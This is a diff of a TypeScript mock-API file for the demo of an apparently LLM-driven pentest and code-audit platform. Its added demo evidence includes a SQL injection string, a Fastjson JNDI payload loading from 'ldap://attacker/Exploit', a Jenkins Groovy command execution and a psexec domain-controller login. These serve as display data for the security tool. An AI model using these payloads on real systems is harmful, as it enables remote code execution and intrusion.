@@ -16,7 +16,6 @@ import type {
   Company,
   CompanyScopeRule,
   Conversation,
-  DepMaterializeResult,
   EvidenceBodyPreview,
   FindingPacket,
   FindingPacketInterface,
@@ -32,8 +31,6 @@ import type {
   TaskAssetMutation,
   TaskAssetScopeMutation,
   TaskCategory,
-  TaskDependencyList,
-  TaskDepsImportEntry,
   TaskLLMResolution,
   TaskScopeRow,
   TaskTemplate,
@@ -75,42 +72,13 @@ const mockLLMRecords = structuredClone(D.llmRecords);
 const mockTaskTemplates = structuredClone(D.taskTemplates);
 const mockTaskCategories = structuredClone(D.taskCategories);
 const mockConversations = structuredClone(D.conversations);
-// 预置一条已完成的复核记录，用来演示「发起复核 → 静态核对 → 三态结论 → 回写漏洞状态」这条闭环。
-// finding_id 用序号（D.findings 里 f-3 是第 3 条），conversation_id 指向 data.ts 里那条 retester 会话。
-// 结论只依据源码：没有、也不能有任何运行时证据。
-const mockRetests: FindingRetest[] = [
-  {
-    id: 1,
-    finding_id: 3,
-    conversation_id: 4,
-    status: "completed",
-    verdict: "confirmed",
-    notes: "这条是最高危里最容易复核的，先确认密钥是否真的随源码进了仓库。",
-    summary: "验签密钥来源唯一且为随仓库提交的明文常量，过滤器已注册进 Spring Security 过滤链，漏洞真实成立。",
-    evidence:
-      "## 核对过的位置\n\n" +
-      "- `mall-common/src/main/java/com/acme/common/security/JwtFilter.java:47` —— `Jwts.parser().setSigningKey(secret)`，算法固定 HS256，`doFilter` 对 `/api/**` 无条件验签，无旁路分支。\n" +
-      "- `mall-web/src/main/resources/application.yml:31` —— `jwt.secret: secret`，字面量，不是占位符。\n" +
-      "- `mall-common/src/main/java/com/acme/common/config/SecurityConfig.java:38` —— `addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)`，过滤器确实在链上。\n\n" +
-      "## 原证据逐条核对\n\n" +
-      "| 原结论 | 核对结果 |\n| --- | --- |\n| 密钥硬编码为 `secret` | 成立。全仓 Grep `jwt.secret\\|JWT_SECRET\\|JWT_SIGNING_KEY` 只命中 1 处，无环境变量占位、无第二份 profile 覆盖。 |\n| 用 HS256 验签 | 成立。密钥用法在 L47，算法未可配置。 |\n| 可离线伪造任意身份 | 成立。密钥为弱口令且随仓库分发，攻击者不需要接触运行环境即可自行签发 token。 |\n\n" +
-      "## 证伪尝试（均失败）\n\n" +
-      "- 检查 test / dev profile 下是否有覆盖配置 —— 无。\n" +
-      "- 检查 `JwtFilter` 是否为未注册的孤儿 Bean —— 不是，已在 `SecurityConfig` 中注册。\n" +
-      "- 检查是否有前置白名单跳过验签 —— 白名单只作用于网关层路径匹配，不改变验签密钥本身。\n\n" +
-      "## 结论依据\n\n触发路径（受保护接口）→ 可控输入（任意外部持 token 者）→ 危险操作（以任意 `sub`/`role` 通过验签）三者闭合，且不存在有效校验或不可达情形，故判定 **confirmed**。\n\n" +
-      "> 说明：复核全程只读源码，未发起任何请求、未做运行时验证。",
-    error: "",
-    created_at: D.T("2026-07-26T03:20:00Z"),
-    started_at: D.T("2026-07-26T03:20:05Z"),
-    finished_at: D.T("2026-07-26T03:26:40Z"),
-  },
-];
+const mockRetests: FindingRetest[] = [];
 const mockRetestMessages: Record<number, Activity[]> = {};
 
 // ── 关联流量证据(finding traffic) ─────────────────────────────────────────────
-// 代码审计平台不出网、不抓包，因此不再有流量证据可绑定：这里恒返回空绑定。
-// 结构保留是因为漏洞详情页仍会请求该接口，缺路由会让页面读到空对象而崩整页。
+// 后端把请求/响应快照独立存到 evidence 表,前端详情页用 FindingTrafficPanel 展示。
+// demo 里为部分漏洞预置绑定,快照直接引用 mock 抓包(data.traffic.exchanges),
+// 其余漏洞返回空绑定。缺了这套路由,详情页会因读到空对象、访问 bindings.length 崩整页。
 const mockExchangeById = new Map((D.traffic.exchanges ?? []).map((exchange) => [exchange.id, exchange]));
 
 interface MockBindingSeed {
@@ -119,12 +87,45 @@ interface MockBindingSeed {
   note?: string;
 }
 
-// 平台不抓包，故无预置绑定。漏洞的证据一律是「源码位置 + 代码片段」，
-// 由 finding.evidence 承载，不走流量快照。
-const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {};
+// 每条漏洞预置的流量证据(finding id → 绑定的抓包)。选取与漏洞语义对应的请求,
+// 让 demo 详情页的「关联流量」区块看起来真实。
+const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-2": [
+    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
+    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+  ],
+  "f-12": [
+    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
+    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+  ],
+  "f-15": [
+    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
+    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+  ],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+};
 
 // demo 用固定报文正文,避免详情页 Request/Response 空白。
-const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {};
+const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
+  "x-2": {
+    req: "q=1' AND 1=CONVERT(int,@@version)--",
+    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
+  },
+  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
+  "x-9": {
+    req: "",
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+  },
+  "x-15": {
+    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
+    resp: '{"status":"error","message":"internal server error"}',
+  },
+  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
+  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
+  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
+  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
+};
 
 // 运行期状态:finding id → 绑定列表(可增删改序,demo 内存态)。首次访问按种子初始化。
 const mockFindingTraffic: Record<string, FindingTrafficBinding[]> = {};
@@ -195,10 +196,9 @@ function mockEvidencePreview(text: string): EvidenceBodyPreview {
   return { content: text, offset: 0, total: text.length, next_offset: text.length, truncated: false, binary: false };
 }
 
-// 推演复核报文（demo 内存态）：finding id → 按接口各一份的报文。
+// 推演复测报文（demo 内存态）：finding id → 按接口各一份的报文。
 // 报文里写死了 Host/路径/参数，一份只对应一个接口，所以用 asset_id 标明归属
 // （"0" 表示未指定接口）。f-3 刻意只生成了两个接口中的一个，用来演示「未生成」提示。
-// 注意：报文是依据源码推演出来的用例，不是抓包证据，复核时只用来核对与锚定接口是否一致。
 const mockFindingPackets: Record<string, FindingPacket[]> = {
   "f-3": [
     {
@@ -206,63 +206,21 @@ const mockFindingPackets: Record<string, FindingPacket[]> = {
       asset_id: "ep-f3-1",
       source: "llm",
       raw_request:
-        "GET /api/user/profile HTTP/1.1\n" +
+        "GET /v1/profile HTTP/1.1\n" +
         "Host: api.acme.com\n" +
-        "Authorization: Bearer <用 application.yml 泄露的 HS256 密钥 secret 离线签发，sub=1>\n" +
+        "Authorization: Bearer <用弱密钥 secret 离线伪造的 HS256 JWT，sub=1>\n" +
         "Accept: application/json\n" +
         "\n",
-      raw_response:
-        'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":1,"username":"admin","role":"admin"}',
-      grounded_refs: [
-        "mall-common/src/main/java/com/acme/common/security/JwtFilter.java:47",
-        "mall-web/src/main/resources/application.yml:31",
-      ],
-      assumptions: ["密钥 secret 与线上一致（配置文件随源码提交）", "sub=1 对应管理员账号"],
+      raw_response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":1,"username":"admin","role":"admin"}',
+      grounded_refs: ["src/main/java/com/acme/api/JwtFilter.java:52", "src/main/resources/application.yml:31"],
+      assumptions: ["令牌由泄露的弱密钥 secret 离线签发", "sub=1 对应管理员账号"],
       validation: {
         valid: true,
         warnings: ["参数 page 未在锚定接口的 params 里登记（可能是新增参数或名称不符）"],
         method: "GET",
-        path: "/api/user/profile",
+        path: "/v1/profile",
         host: "api.acme.com",
         bytes: 128,
-        checked_at: new Date().toISOString(),
-      },
-      valid: true,
-      generator: "worker-2",
-      prompt_version: "retest-packet/v1",
-      revision: 1,
-      created_at: new Date().toISOString(),
-      updated_at: new Date().toISOString(),
-    },
-  ],
-  "f-7": [
-    {
-      finding_id: "f-7",
-      asset_id: "ep-f7-1",
-      source: "llm",
-      raw_request:
-        "POST /api/order/import HTTP/1.1\n" +
-        "Host: api.acme.com\n" +
-        "Content-Type: application/json\n" +
-        "\n" +
-        '{"@type":"com.example.EvilBean","payload":"<由 fastjson 1.2.24 autoType 触发的实例化链>"}',
-      raw_response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"code":0,"msg":"ok"}',
-      grounded_refs: [
-        "mall-order/src/main/java/com/acme/order/controller/ImportController.java:51",
-        "pom.xml:88",
-        "mall-common/src/main/java/com/acme/common/config/FastjsonConfig.java:22",
-      ],
-      assumptions: [
-        "网关白名单仍然放行 /api/order/import（依据 gateway-routes.yml:44）",
-        "@type 未被任何前置过滤器剥离",
-      ],
-      validation: {
-        valid: true,
-        warnings: [],
-        method: "POST",
-        path: "/api/order/import",
-        host: "api.acme.com",
-        bytes: 96,
         checked_at: new Date().toISOString(),
       },
       valid: true,
@@ -278,12 +236,8 @@ const mockFindingPackets: Record<string, FindingPacket[]> = {
 // demo 里漏洞锚定的接口槽位：没有报文的接口也要列出来，否则一份报文看起来像覆盖了全部资产。
 const mockFindingInterfaces: Record<string, FindingPacketInterface[]> = {
   "f-3": [
-    { asset_id: "ep-f3-1", label: "GET https://api.acme.com/api/user/profile", has_packet: false },
-    { asset_id: "ep-f3-2", label: "GET https://api.acme.com/api/order/{id}", has_packet: false },
-  ],
-  "f-7": [
-    { asset_id: "ep-f7-1", label: "POST https://api.acme.com/api/order/import", has_packet: false },
-    { asset_id: "ep-f7-2", label: "POST https://api.acme.com/api/login", has_packet: false },
+    { asset_id: "ep-f3-1", label: "GET https://api.acme.com/v1/profile", has_packet: false },
+    { asset_id: "ep-f3-2", label: "GET https://api.acme.com/v1/orders", has_packet: false },
   ],
 };
 
@@ -298,300 +252,15 @@ function mockPacketCoverage(findingID: string): FindingPackets {
   return { packets, interfaces };
 }
 
-// ── 第三方依赖（jar 清单 / 本地仓库导入 / 按需反编译）──────────────────────────
-// demo 里镜像 acme-mall 的 pom.xml：清单与类名索引始终可用，反编译按需触发。
-type MockDep = {
-  id: number;
-  gav: string;
-  group_id: string;
-  artifact_id: string;
-  version: string;
-  classifier?: string;
-  gav_source: string;
-  scope?: string;
-  direct: boolean;
-  size_bytes: number;
-  class_count: number;
-  package_count: number;
-  multi_release: boolean;
-  corrupt: boolean;
-  native_heavy: boolean;
-  source_state: "none" | "original" | "decompiled";
-  source_path?: string;
-  source_files: number;
-  source_bytes: number;
-  decompiler?: string;
-  error?: string;
-  top_packages?: string[];
-  can_materialize: boolean;
-  materialized_at?: string;
-};
-
-let mockDeps: MockDep[] = [
-  {
-    id: 1,
-    gav: "com.alibaba:fastjson:1.2.24",
-    group_id: "com.alibaba",
-    artifact_id: "fastjson",
-    version: "1.2.24",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: true,
-    size_bytes: 641233,
-    class_count: 812,
-    package_count: 27,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "none",
-    source_files: 0,
-    source_bytes: 0,
-    decompiler: "",
-    top_packages: ["com.alibaba.fastjson", "com.alibaba.fastjson.parser", "com.alibaba.fastjson.serializer"],
-    can_materialize: true,
-  },
-  {
-    id: 2,
-    gav: "org.apache.logging.log4j:log4j-core:2.14.1",
-    group_id: "org.apache.logging.log4j",
-    artifact_id: "log4j-core",
-    version: "2.14.1",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: true,
-    size_bytes: 1789120,
-    class_count: 1420,
-    package_count: 41,
-    multi_release: true,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "none",
-    source_files: 0,
-    source_bytes: 0,
-    decompiler: "",
-    top_packages: ["org.apache.logging.log4j.core", "org.apache.logging.log4j.core.config"],
-    can_materialize: true,
-  },
-  {
-    id: 3,
-    gav: "org.springframework.boot:spring-boot:2.6.4",
-    group_id: "org.springframework.boot",
-    artifact_id: "spring-boot",
-    version: "2.6.4",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: true,
-    size_bytes: 1502112,
-    class_count: 986,
-    package_count: 34,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "original",
-    source_path: "deps/src/org.springframework.boot-spring-boot-2.6.4",
-    source_files: 902,
-    source_bytes: 4820113,
-    top_packages: ["org.springframework.boot", "org.springframework.boot.web"],
-    can_materialize: false,
-    materialized_at: "2026-07-25T14:32:00Z",
-  },
-  {
-    id: 4,
-    gav: "org.mybatis.spring.boot:mybatis-spring-boot-starter:2.1.4",
-    group_id: "org.mybatis.spring.boot",
-    artifact_id: "mybatis-spring-boot-starter",
-    version: "2.1.4",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: true,
-    size_bytes: 18422,
-    class_count: 96,
-    package_count: 6,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "original",
-    source_path: "deps/src/org.mybatis.spring.boot-mybatis-spring-boot-starter-2.1.4",
-    source_files: 88,
-    source_bytes: 412900,
-    top_packages: ["org.mybatis.spring.boot.autoconfigure"],
-    can_materialize: false,
-    materialized_at: "2026-07-25T14:33:00Z",
-  },
-  {
-    id: 5,
-    gav: "mysql:mysql-connector-java:8.0.28",
-    group_id: "mysql",
-    artifact_id: "mysql-connector-java",
-    version: "8.0.28",
-    gav_source: "pom.properties",
-    scope: "runtime",
-    direct: true,
-    size_bytes: 2450112,
-    class_count: 640,
-    package_count: 18,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "none",
-    source_files: 0,
-    source_bytes: 0,
-    top_packages: ["com.mysql.cj.jdbc", "com.mysql.cj.protocol"],
-    can_materialize: true,
-  },
-  {
-    id: 6,
-    gav: "com.google.guava:guava:31.0.1-jre",
-    group_id: "com.google.guava",
-    artifact_id: "guava",
-    version: "31.0.1-jre",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: false,
-    size_bytes: 3013112,
-    class_count: 2011,
-    package_count: 62,
-    multi_release: true,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "decompiled",
-    source_path: "deps/src/com.google.guava-guava-31.0.1-jre",
-    source_files: 1980,
-    source_bytes: 9120440,
-    decompiler: "cfr",
-    top_packages: ["com.google.common.collect", "com.google.common.base"],
-    can_materialize: false,
-    materialized_at: "2026-07-25T14:41:00Z",
-  },
-  {
-    id: 7,
-    gav: "commons-io:commons-io:2.11.0",
-    group_id: "commons-io",
-    artifact_id: "commons-io",
-    version: "2.11.0",
-    gav_source: "pom.properties",
-    scope: "compile",
-    direct: false,
-    size_bytes: 327112,
-    class_count: 214,
-    package_count: 9,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: false,
-    source_state: "none",
-    source_files: 0,
-    source_bytes: 0,
-    top_packages: ["org.apache.commons.io"],
-    can_materialize: true,
-  },
-  {
-    id: 8,
-    gav: "org.projectlombok:lombok:1.18.22",
-    group_id: "org.projectlombok",
-    artifact_id: "lombok",
-    version: "1.18.22",
-    gav_source: "pom.properties",
-    scope: "provided",
-    direct: true,
-    size_bytes: 1998122,
-    class_count: 0,
-    package_count: 0,
-    multi_release: false,
-    corrupt: false,
-    native_heavy: true,
-    source_state: "none",
-    source_files: 0,
-    source_bytes: 0,
-    error: "注解处理器包，无 class 文件，反编译无意义",
-    can_materialize: false,
-  },
-];
-
-const mockDepsEngine = "cfr (java 11)";
-
-function mockDepsTaskKey(id: string): string {
-  return id === "" ? "t-acme-web" : id;
-}
-
-function mockDepsList(id: string): TaskDependencyList {
-  const materialized = mockDeps.filter((d) => d.source_state !== "none").length;
-  return {
-    task_id: mockDepsTaskKey(id),
-    deps: structuredClone(mockDeps),
-    engine: mockDepsEngine,
-    decompile_available: true,
-    total_classes: mockDeps.reduce((a, d) => a + d.class_count, 0),
-    materialized,
-    local_repo: "/root/.m2/repository",
-    local_repo_available: true,
-  };
-}
-
-function mockDepsRescan() {
-  const jars = mockDeps.length;
-  return {
-    jars,
-    dependencies: jars,
-    indexed_class: mockDeps.reduce((a, d) => a + d.class_count, 0),
-    engine: mockDepsEngine,
-  };
-}
-
-function mockDepsImport() {
-  const results: TaskDepsImportEntry[] = [
-    { gav: "org.apache.commons:commons-lang3:3.12.0", status: "imported", sources: true, scope: "compile", jar_path: "/root/.m2/repository/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar" },
-    { gav: "com.fasterxml.jackson.core:jackson-databind:2.13.1", status: "imported", sources: false, scope: "compile", jar_path: "/root/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.13.1/jackson-databind-2.13.1.jar" },
-    { gav: "com.alibaba:fastjson:1.2.24", status: "already", scope: "compile" },
-    { gav: "org.example:not-in-repo:1.0.0", status: "not_found" },
-    { gav: "com.acme:${revision}", status: "unresolved_version", error: "pom 版本是属性占位符，需先解析" },
-  ];
-  return {
-    imported: 2,
-    already_present: 1,
-    not_found: 1,
-    skipped: 1,
-    jars: 2,
-    dependencies: mockDeps.length + 2,
-    indexed_class: mockDeps.reduce((a, d) => a + d.class_count, 0) + 1620,
-    engine: mockDepsEngine,
-    local_repo: "/root/.m2/repository",
-    scanned_poms: 1,
-    results,
-    notes: ["扫描到 1 个 pom.xml（mall-order/pom.xml）", "3 个坐标已存在，未重复导入"],
-  };
-}
-
-function mockDepsMaterialize(depID: number): DepMaterializeResult {
-  const dep = mockDeps.find((d) => d.id === depID);
-  if (!dep) throw new Error("依赖不存在");
-  if (!dep.can_materialize) throw new Error(dep.error || "该依赖无法反编译");
-  const files = dep.class_count;
-  dep.source_state = "decompiled";
-  dep.source_path = `deps/src/${dep.gav.replace(/:/g, "-")}`;
-  dep.source_files = files;
-  dep.source_bytes = dep.size_bytes * 3;
-  dep.decompiler = "cfr";
-  dep.materialized_at = new Date().toISOString();
-  dep.can_materialize = false;
-  return {
-    dependency: structuredClone(dep),
-    from_cache: false,
-    files,
-    bytes: dep.source_bytes,
-    engine: mockDepsEngine,
-    duration_ms: 47200,
-  };
-}
-
 function advanceMockRetests() {
   for (const retest of mockRetests) {
     if (retest.status !== "running" || retest.conversation_id == null) continue;
     if (Date.now() - Date.parse(retest.created_at) < 15000) continue;
     retest.status = "completed";
     retest.verdict = "inconclusive";
-    retest.summary = "演示环境未连接真实 Agent，无法完成源码级复核。";
+    retest.summary = "演示环境未执行真实验证，无法确认漏洞当前状态。";
     retest.evidence =
-      "### 演示记录\n\n已关联原漏洞、原证据与锚定接口。此环境未连接真实 Agent，未对源码做逐条核对；请在实际部署中从漏洞详情发起复核。";
+      "### 演示记录\n\n已关联原漏洞。此环境未连接真实 Agent，也未向目标发送请求；请在实际部署中执行复测。";
     retest.finished_at = new Date().toISOString();
     mockRetestMessages[retest.conversation_id].push({
       seq: 3,
@@ -609,20 +278,13 @@ function stopMockRetest(conversationID: number) {
     if (retest.conversation_id !== conversationID || !["pending", "running"].includes(retest.status)) continue;
     retest.status = "stopped";
     retest.finished_at = new Date().toISOString();
-    retest.error = "演示复核已停止";
+    retest.error = "演示复测已停止";
   }
 }
 const mockIntents = structuredClone(D.intents);
 const mockCompanies = structuredClone(D.companies);
 const mockAssets = structuredClone(D.assets);
 const mockActivity = structuredClone(D.activity);
-
-// 意图 → 所属任务：活动流是跨任务的，需要按意图回溯到任务上打标。
-const MOCK_INTENT_TASK: Record<string, string> = {
-  i9: "t-vpn-edge",
-  i10: "t-shop-pay",
-  i11: "t-acme-api",
-};
 type MockTaskArchiveSnapshot = {
   task: Task;
   numericTaskID: number;
@@ -1944,25 +1606,6 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (seg[0] === "tasks" && seg[2] === "coverage-graph") return D.coverageGraph;
   if (seg[0] === "tasks" && seg[2] === "asset-refs") return D.assetRefsFor(Number(q.get("asset_id") ?? 0));
 
-  // ── 第三方依赖（清单 / 本地仓库导入 / 重扫 / 清空 / 按需反编译）──
-  // 上传依赖包（POST /tasks/{id}/deps）带文件，走 XHR，MOCK 模式下由 api.ts 直接短路。
-  if (seg[0] === "tasks" && seg[2] === "deps" && seg.length === 3 && m === "GET") {
-    return mockDepsList(seg[1]);
-  }
-  if (seg[0] === "tasks" && seg[2] === "deps" && seg[3] === "import" && m === "POST") {
-    return mockDepsImport();
-  }
-  if (seg[0] === "tasks" && seg[2] === "deps" && seg[3] === "rescan" && m === "POST") {
-    return mockDepsRescan();
-  }
-  if (seg[0] === "tasks" && seg[2] === "deps" && seg[3] === "clear" && m === "POST") {
-    mockDeps = [];
-    return { ok: true };
-  }
-  if (seg[0] === "tasks" && seg[2] === "deps" && seg[4] === "materialize" && m === "POST") {
-    return mockDepsMaterialize(Number(seg[3]));
-  }
-
   // ── 任务测试范围（增删查）──
   if (seg[0] === "tasks" && seg[2] === "scope" && seg.length === 3 && m === "GET") {
     return { scope: mockTaskScopes.get(seg[1]) ?? [] };
@@ -1997,7 +1640,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     return {
       by_profile: [
         {
-          profile_name: "Claude Opus 4.8",
+          profile_name: "default",
           calls: 60,
           tasks: 4,
           input_tokens: 1570000,
@@ -2006,20 +1649,29 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
           cache_write_tokens: 140000,
         },
       ],
-      // 相对「今天」生成 30 天，保证 7 天 / 30 天视图都有数据（写死日期会随时间推移变空）。
-      daily: Array.from({ length: 30 }, (_, i) => {
-        const d = new Date();
-        d.setDate(d.getDate() - (29 - i));
-        const wave = 380000 + Math.round(300000 * Math.abs(Math.sin(i / 2.6)));
-        return {
+      daily: [
+        {
           profile_name: "default",
-          date: d.toISOString().slice(0, 10),
-          input_tokens: wave,
-          output_tokens: Math.round(wave * 0.07),
-          cache_read_tokens: Math.round(wave * 0.7),
-          cache_write_tokens: Math.round(wave * 0.12),
-        };
-      }),
+          date: "2026-08-18",
+          input_tokens: 520000,
+          output_tokens: 38000,
+          cache_read_tokens: 370000,
+        },
+        {
+          profile_name: "default",
+          date: "2026-08-19",
+          input_tokens: 640000,
+          output_tokens: 45000,
+          cache_read_tokens: 460000,
+        },
+        {
+          profile_name: "default",
+          date: "2026-08-20",
+          input_tokens: 410000,
+          output_tokens: 27000,
+          cache_read_tokens: 290000,
+        },
+      ],
     };
 
   // ── 按模型 token 用量（demo：一条示例）──
@@ -2027,7 +1679,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     return {
       models: [
         {
-          model: "claude-opus-4-8",
+          model: "claude-opus-4-6",
           calls: 42,
           input_tokens: 1250000,
           output_tokens: 86000,
@@ -2035,7 +1687,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
           cache_write_tokens: 120000,
         },
         {
-          model: "deepseek-v4-flash",
+          model: "claude-haiku-4-5",
           calls: 18,
           input_tokens: 320000,
           output_tokens: 24000,
@@ -2202,11 +1854,11 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     let mappings: Array<{ intentID: string; assetID: number; summary: string }> = [];
     if (seg[1] === "t-acme-web") {
       mappings = [
-        { intentID: "i2", assetID: 6, summary: "搜索接口的 SQL 拼装在本意图内定位到文件与行" },
-        { intentID: "i3", assetID: 8, summary: "订单查询路径的归属校验在本意图内核对" },
+        { intentID: "i3", assetID: 6, summary: "后台功能枚举意图从前序子域发现中选定" },
+        { intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" },
       ];
     } else if (seg[1] === "t-acme-api") {
-      mappings = [{ intentID: "i11", assetID: 15, summary: "后台管理接口的角色校验覆盖在本意图内核对" }];
+      mappings = [{ intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" }];
     }
     const sourceTaskID = mockTaskAssetID(seg[1]) ?? 0;
     const assets: IntentAsset[] = mappings.flatMap((mapping) => {
@@ -2380,7 +2032,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       mockConversations.unshift({
         id: conversationID,
         agent_key: "retester",
-        title: `复核 #${finding.id} · ${finding.name || finding.vulnclass}`,
+        title: `复测 #${finding.id} · ${finding.name || finding.vulnclass}`,
         pinned: false,
         created_at: now,
         updated_at: now,
@@ -2406,7 +2058,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
           worker: "retester",
           ts: now,
           kind: "user",
-          summary: `请复核漏洞 #${finding.id}`,
+          summary: `请复测漏洞 #${finding.id}`,
           detail: retest.notes,
         },
         {
@@ -2414,8 +2066,8 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
           worker: "retester",
           ts: now,
           kind: "text",
-          summary: "演示复核进行中（未对源码做逐条核对）",
-          detail: "演示复核进行中（未对源码做逐条核对）",
+          summary: "演示复测进行中（未向目标发送请求）",
+          detail: "演示复测进行中（未向目标发送请求）",
         },
       ];
       return { retest: structuredClone(retest), created: true };
@@ -2533,7 +2185,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     // 列表:GET /traffic
     return mockTrafficSummary(findingID);
   }
-  // 推演复核报文（LLM 依据源码生成，非抓包证据），按接口一份：
+  // 推演复测报文（LLM 依据源码生成，非抓包证据），按接口一份：
   //   GET    /packets            列出全部报文 + 接口槽位（含未生成报文的接口）
   //   PATCH  /packets/{assetID}  人工修订某一个接口的报文
   //   DELETE /packets/{assetID}  清除某一个接口的报文
@@ -2706,25 +2358,6 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     const limit = Math.max(1, Number(q.get("limit") ?? 300));
     const items = mockActivity.filter((item) => item.seq > since).slice(0, limit);
     return { items, cursor: items.length ? items[items.length - 1].seq : since };
-  }
-  // 仪表盘活动流：跨任务最近事件。每条补 task_id / task_description 标注（真实后端
-  // 只在 recent 这个接口返回这两个字段，供活动流显示「这条事件属于哪个任务」）。
-  if (seg[0] === "exploration" && seg[1] === "activity" && seg[2] === "recent") {
-    const limit = Math.max(1, Number(q.get("limit") ?? 30));
-    const items = mockActivity
-      .filter((item) => item.kind !== "usage")
-      .slice(-limit)
-      .map((item) => {
-        const intentID = item.intent_id ?? "";
-        const taskID =
-          MOCK_INTENT_TASK[intentID] ?? (item.worker === "mainagent" ? "t-acme-web" : "t-acme-web");
-        return {
-          ...item,
-          task_id: taskID,
-          task_description: D.getTask(taskID)?.description ?? "",
-        };
-      });
-    return { items };
   }
   if (seg[0] === "exploration" && seg[1] === "activity" && seg.length === 3) {
     const a = mockActivity.find((x) => x.seq === Number(seg[2]));
@@ -2974,9 +2607,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       page_size: size,
     };
   }
-  // 拦截范围 = 写入类工具。读工具（LS/Glob/Grep/Read）的正常路径就是 ../source、../deps，
-  // 纳入范围会把每次读取都拦下来，所以平台只对可能改动文件系统的工具做规则匹配。
-  if (path === "/intercept/tool-config") return { enabled_tools: ["Write", "Edit", "MultiEdit"] };
+  if (path === "/intercept/tool-config") return { enabled_tools: ["bash"] };
   if (path === "/intercept/judge" && m === "GET")
     return {
       enabled: false,
